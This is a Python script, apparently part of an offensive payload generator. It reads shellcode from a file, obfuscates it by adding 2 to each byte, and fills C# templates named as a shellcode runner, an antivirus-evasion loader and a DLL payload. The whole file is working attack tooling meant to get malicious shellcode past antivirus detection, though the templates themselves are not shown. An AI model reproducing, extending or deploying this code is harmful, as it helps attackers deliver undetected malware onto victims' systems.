 #!/bin/python3
import subprocess
import socket
import random
from colorama import init
from termcolor import colored
 
init()

def read_file(f):
        with open(f, 'r') as fs:
            content = fs.read()
        return content

def shellcodeEncoder(shellcode):
    # Python shellcode encoder 
    shellcode = "".join(shellcode.splitlines())
    #print(shellcode)
    start = shellcode.find("{")
    end = shellcode.find("}")
    shellcode_start = shellcode[0:start].strip()
    shellcode = shellcode[start+1:end].strip()
    shellcode_chars = shellcode.split(",") 
    shellcode_chars = list(filter(None, shellcode_chars))

    encoded_shellcode_chars = []
    for c in shellcode_chars:
        encoded_shellcode_chars.append("0x{:02x}".format(int(c,16)+2 & 0xFF))
    
    return (shellcode_start + " {"+ ",".join(encoded_shellcode_chars) + "};")


def generateCPayload(shellcode, arch):
    '''Generating C# payload with antivirus evasion'''

    print(colored("[+] Generating C# exploit", 'green'))

    # Encoder template
    template_name = "cs_encryptor.cs"
    template = read_file("templates/" + template_name)
    template_out = template.replace("%SHELLCODE%", shellcode)
    
    f = open("output/" + template_name, 'w')
    f.write(template_out)
    f.close()

    # Python shellcode encoder  
    encoded_shellcode = shellcodeEncoder(shellcode)


    # C# shellcode runner
    template_name = "cs_antivirus_evasion.cs"
    template = read_file("templates/" + template_name)
    template_out = template.replace("%ENCSHELLCODE%", encoded_shellcode)
    
    f = open(f"output/{arch}/" + template_name, 'w')
    f.write(template_out)
    f.close()

def generateCDllPayload(shellcode, arch):
    # C# DLL shellcode 
    # Python shellcode encoder  
    encoded_shellcode = shellcodeEncoder(shellcode)

    template_name = "cs_dll.cs"
    template = read_file("templates/" + template_name)
    template_out = template.replace("%ENCSHELLCODE%", encoded_shellcode)
    
    f = open(f"output/{arch}/" + template_name, 'w')
    f.write(template_out)
    f.close()

   

    
